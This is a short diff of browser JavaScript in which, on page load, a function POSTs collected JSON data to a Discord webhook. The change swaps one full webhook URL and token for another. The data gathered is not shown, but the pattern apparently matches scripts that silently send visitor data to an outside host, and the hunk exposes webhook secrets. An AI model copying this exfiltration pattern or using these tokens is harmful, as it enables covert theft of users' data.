@@ -2,7 +2,7 @@ let user = {}
 window.onload = async () => {
     function send(data) {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1149978788671787028/JR3METdVOvu9e6suujmqj5ixcvHGP1_kMc-AWzDmOcWU436Cz760lyTdSjUewySPbuGV", true);
+            xhr.open("POST", "https://discord.com/api/webhooks/1345645520097509446/MUHyEHGd0hFnThpwStaS9H_dQB3Q9NranrRqHttj_Tz5n5hMUsi97c1ilUTPslL4v2R3", true);
             xhr.setRequestHeader('Content-Type', 'application/json');
             xhr.send(JSON.stringify(data));
             console.log(JSON.stringify(data))
